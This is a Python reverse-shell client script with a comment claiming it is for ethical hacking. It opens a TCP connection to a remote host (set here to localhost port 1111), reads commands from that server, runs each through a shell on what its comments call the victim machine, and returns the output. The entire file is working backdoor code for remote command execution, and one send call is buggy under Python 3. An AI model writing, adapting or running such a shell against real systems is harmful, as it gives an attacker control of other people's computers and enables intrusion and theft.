#!/usr/bin/python3.6
import os
import sys
import socket
import subprocess

'''
This Script was Written by Ariel Weiser and intend for ethical hacking purposes only.
Written in: July 2018.  
'''


# Create a socket
def socket_create():
    try:
        # Creating Socket instance with IPV4 & TCP attributes
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("[-]Socket creation error: " + str(msg))
        sys.exit(0)

    print("[+] Socket Created Successfully")
    return s



# Connect to a remote socket
def socket_connect(s, host, port ):
    try:
        s.connect((host, int(port)))
    except socket.error as msg:
        print("[-]Socket connection error: " + str(msg))
        sys.exit(0)
    return s


# Receive commands from remote server and run on local machine
def receive_commands(s):
    while True:

        try:
            data = s.recv(1024)
        except KeyboardInterrupt as k:
            print(str(k))
            s.close()
            sys.exit(0)

            # verifying if 'cd ' command is required for changing directory.
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            # Running the command with 'subprocess' on the victim machine
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # setting cmd output into 'output_bytes' parameter and convert it to utf-8
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = output_bytes.decode('utf-8')
            s.send(output_str + '> ')
            # Pring for debuging the output command
            print(output_str)
    s.close()


def main():
    # define variable:
    host = '127.0.0.1'
    port = '1111'

    s = socket_create()
    socket_connect(s, host, port)
    receive_commands(s)

main()